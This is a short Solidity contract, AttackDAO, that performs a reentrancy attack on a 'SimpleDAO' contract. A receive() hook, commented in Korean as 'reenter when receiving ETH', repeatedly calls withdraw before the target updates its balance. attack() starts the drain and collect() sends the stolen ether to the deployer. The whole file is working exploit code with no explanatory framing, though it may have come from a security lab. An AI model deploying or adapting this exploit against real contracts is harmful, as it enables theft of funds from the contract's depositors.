// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ISimpleDAO {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract AttackDAO {
    ISimpleDAO public dao;
    address public owner;

    constructor(address _dao) {
        dao = ISimpleDAO(_dao);
        owner = msg.sender;
    }

    // ETH 받을 때 재진입
    receive() external payable {
        if(address(dao).balance >= 1 ether) {
            dao.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);

        dao.deposit{value: 1 ether}();
        dao.withdraw(1 ether);
    }

    function collect() external {
        require(msg.sender == owner);

        payable(owner).transfer(address(this).balance);
    }
}